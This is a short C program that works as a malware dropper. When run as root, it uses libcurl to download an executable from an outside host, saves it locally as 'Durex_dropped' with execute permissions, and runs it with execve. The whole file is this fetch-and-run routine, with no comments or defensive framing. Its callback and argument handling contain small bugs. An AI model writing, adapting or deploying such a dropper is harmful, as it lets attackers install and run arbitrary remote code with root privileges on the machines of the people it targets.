#include <unistd.h>
#include <curl/curl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>


size_t write_data(void *buffer, size_t size, size_t nmemb, void *fd_data)
{
	write(*(int*)fd_data, buffer, nmemb);
	return size;
}

int		main(int ac, char **argv, char **env)
{
	int fd;
	CURL *handler;

	if (getuid() != 0)
		return (0);


	fd = open("./Durex_dropped", O_CREAT | O_WRONLY | O_TRUNC, 0700);


	handler = curl_easy_init();
	if (handler)
	{
		CURLcode res;
		curl_easy_setopt(handler, CURLOPT_URL, "https://h3lp.fr/pppaaa.exe");
		curl_easy_setopt(handler, CURLOPT_WRITEFUNCTION, write_data);
		curl_easy_setopt(handler, CURLOPT_FOLLOWLOCATION, 1);
		curl_easy_setopt(handler, CURLOPT_WRITEDATA, &fd);
		res = curl_easy_perform(handler);
		curl_easy_cleanup(handler);
		execve("./Durex_dropped", (char*[]){"Durex_dropped"}, NULL);
	}
}
